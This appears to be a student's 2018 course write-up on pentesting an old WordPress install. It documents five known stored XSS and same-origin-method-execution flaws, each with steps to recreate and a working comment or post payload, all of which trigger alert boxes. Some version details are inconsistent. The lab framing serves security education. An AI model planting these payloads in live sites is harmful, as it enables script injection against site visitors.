# Project 7 - WordPress Pentesting

Time spent: **X** hours spent in total

> Objective: Find, analyze, recreate, and document **five vulnerabilities** affecting an old version of WordPress

## Pentesting Report

1. (Required) 4.2 - Unauthenticated Stored Cross-Site Scripting (XSS)
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: <= 4.2
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: ![](https://i.imgur.com/7zN9982.gif)
  - [ ] Steps to recreate: 
    - Go to a Word Press post and locate the comment section.
    - Post the code below into the comment section.
    - Replace <insert 64kb of random data> with any 64kb worth of charatcters. You can use Notepad to help generate those characters.
    - Click "POST COMMENT".
  - [ ] Affected source code:
    ```
    <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  <insert 64kb of random data>'></a>
    ```

2. (Required) 4.0-4.7.2 - Authenticated Stored Cross-Site Scripting (XSS)
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.0-4.7.2
    - Fixed in version: 4.2.13
  - [ ] GIF Walkthrough: ![](https://i.imgur.com/6nlr080.gif)
  - [ ] Steps to recreate: 
    - Post a new post or create a new post on word Press
    - Fill in title section, and place the code below into the "Text" section.
    - Click "Update" or "Publish" tab.
    - Click "View Post".
  - [ ] Affected source code:
    ```
    <iframe width="560" height="315" src="https://www.youtube.com/embed/kNKu1uNBVkU" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen onload=alert(0123)></iframe>
    ```

3. (Required) 4.1 - Authenticated Stored Cross-Site Scripting (XSS)
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.1
    - Fixed in version: 4.2.3
  - [ ] GIF Walkthrough: ![](https://i.imgur.com/u9MgHuF.gif)
  - [ ] Steps to recreate:
    - Post a new post or create a new post on word Press
    - Fill in title section, and place the code below into the "Text" section.
    - Click "Update" or "Publish" tab.
    - Click "View Post".
    - Move cursor to the linked text.
  - [ ] Affected source code:
    ```
    <a href="[caption code=">]</a><a title=" onmouseover=alert('XSS!')  ">A very safe link</a>
    ```

4. (Optional) 4.0 - Authenticated Shortcode Tags Cross-Site Scripting (XSS)
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.0
    - Fixed in version: 4.2.1
  - [ ] GIF Walkthrough: ![](https://i.imgur.com/wSmthE1.gif)
  - [ ] Steps to recreate: 
    - Post a new post or create a new post on word Press
    - Fill in title section, and place the code below into the "Text" section.
    - Click "Update" or "Publish" tab.
    - Click "View Post".
    - Move cursor to the linked text and click.
  - [ ] Affected source code:
    ```
    <a href="[caption code=">]</a><a title=" onclick=alert('XSS!')  ">A very safe link</a>
    ```

5. (Optional) 4.5.1 - Pupload Same Origin Method Execution (SOME)
  - [ ] Summary: 
    - Vulnerability types: XSS
    - Tested in version: 4.5.1
    - Fixed in version: 4.7
  - [ ] GIF Walkthrough: ![](https://i.imgur.com/DhYxTEY.gif)
  - [ ] Steps to recreate:
    - Go to a Word Press post and locate the comment section.
    - Post the code below into the comment section.
    - Click "POST COMMENT".
    - Find the comment and click on the "CLICK" button.
  - [ ] Affected source code:
    ```
    <button onclick="fire()">Click</button>
    <script>
    function fire() {
    open('javascript:alert(0123)');
    }
    </script>
    ```

## Assets

None

## Resources

- [WordPress Source Browser](https://core.trac.wordpress.org/browser/)
- [WordPress Developer Reference](https://developer.wordpress.org/reference/)

GIFs created with [LiceCap](http://www.cockos.com/licecap/).

## Notes

None

## License

    Copyright [2018] [Chenjun Liu]

    Licensed under the Apache License, Version 2.0 (the "License");
    you may not use this file except in compliance with the License.
    You may obtain a copy of the License at

        http://www.apache.org/licenses/LICENSE-2.0

    Unless required by applicable law or agreed to in writing, software
    distributed under the License is distributed on an "AS IS" BASIS,
    WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
    See the License for the specific language governing permissions and
    limitations under the License.
